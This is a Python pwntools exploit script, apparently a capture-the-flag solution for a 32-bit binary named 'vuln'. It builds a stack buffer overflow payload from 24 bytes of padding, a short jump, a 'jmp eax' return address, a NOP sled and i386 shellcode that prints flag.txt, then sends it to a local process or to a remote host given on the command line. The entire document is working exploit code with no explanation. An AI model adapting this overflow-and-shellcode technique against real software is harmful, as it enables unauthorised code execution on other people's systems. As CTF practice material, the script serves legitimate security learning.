import pwn
import argparse


parser = argparse.ArgumentParser()
parser.add_argument("destination", type=str, choices={"local", "remote"})
parser.add_argument("--host", type=str, default="", required=False)
parser.add_argument("--port", type=int, default=0, required=False)
args = parser.parse_args()

elf = pwn.ELF("vuln")
offset = 24

short_jmp = b"\xeb\x08\x90\x90"

new_eip = pwn.p32(0x0805334b) # jmp eax
shellcode = pwn.asm(pwn.shellcraft.i386.linux.cat("flag.txt"))

payload = b"".join(
        [
            b"A" * offset,
            short_jmp,
            new_eip,
            b"\x90" * (500 - len(shellcode)),
            shellcode
        ]
)

payload += b"\n"

with open("payload", "wb") as filp:
    filp.write(payload)

if args.destination == "local":
    p = elf.process()
elif args.destination == "remote":
    if not args.host or not args.port:
        pwn.warning("supply -host for target and -port for port")
        exit()
    p = pwn.remote(args.host, args.port)


p.sendline(payload)
print(p.recvall().decode("latin-1"))



